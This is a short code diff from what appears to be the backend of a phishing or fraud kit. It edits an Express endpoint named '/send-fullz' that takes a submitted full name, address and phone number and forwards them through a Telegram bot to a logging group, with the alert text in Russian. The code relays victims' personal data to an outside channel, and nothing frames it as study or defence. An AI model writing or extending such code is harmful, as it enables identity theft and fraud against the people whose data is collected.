@@ -616,15 +616,15 @@ app.delete('/cart/remove', async (req, res) => {
 
 app.post('/send-fullz', async (req, res) => {
     try {
-        const { title, fullName, address, phoneNumber } = req.body;
+        const { fullName, address, phoneNumber } = req.body;
 
-        if (!title || !fullName || !address || !phoneNumber) {
+        if (!fullName || !address || !phoneNumber) {
             return res.sendStatus(404);
         }
 
         await bot.sendMessage(loggingGroupId, `🪪 Получены данные!
         
-Имя: ${title} ${fullName}
+Имя: ${fullName}
 Адресс: ${address}
 Номер: ${phoneNumber}
 
